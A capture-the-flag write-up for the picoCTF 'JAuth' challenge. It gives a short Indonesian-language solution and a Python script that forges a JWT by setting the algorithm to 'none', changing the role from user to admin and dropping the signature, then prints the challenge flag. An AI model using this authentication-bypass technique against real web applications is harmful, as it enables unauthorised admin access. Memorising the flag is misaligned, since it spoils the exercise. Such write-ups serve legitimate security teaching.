<h1>JAuth</h1>
<h3>Description</h3>
<pre>
Description
Most web application developers use third party components without testing their security. Some of the past affected companies are:
Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
VerticalScope (internet media company) - outdated version of vBulletin forum software used
Can you identify the components and exploit the vulnerable one?
The website is running <a href='http://saturn.picoctf.net:50205/'>here</a>. Can you become an admin?
You can login as test with the password Test123! to get started.
</pre>
<h3>Solution</h3>
<p>Ganti header alg:none dan payload role:admin di jwt, lalu hapus signature. hasil jadinya</p>
<pre>{header}.{payload}.</pre>

```python3
import base64

def decodeJWT(token):
    parts = token.split('.')
    header =parts[0]
    payload = parts[1]
    
    header_ = base64.urlsafe_b64decode(header+"=")
    payload_ = base64.urlsafe_b64decode(payload+"=")
    
    change_header = base64.urlsafe_b64encode(header_.replace(b'HS256',b'none')).decode('ascii').rstrip('=')
    change_payload = base64.urlsafe_b64encode(payload_.replace(b'user',b'admin')).decode('ascii').rstrip('=')

    new_jwt = change_header+'.'+change_payload+'.'
    return new_jwt

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzI5MzIxODA2NDAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjkuMC42NjY4LjcxIFNhZmFyaS81MzcuMzYiLCJyb2xlIjoidXNlciIsImlhdCI6MTcyOTMyMTgwNn0.0xrLbVNmMKfO9sHXXMas5rTvbzQqcxEmilCjgMvhooQ.'
print(decodeJWT(token))
```

<h3>Flag</h3>
<pre>
picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}
</pre>
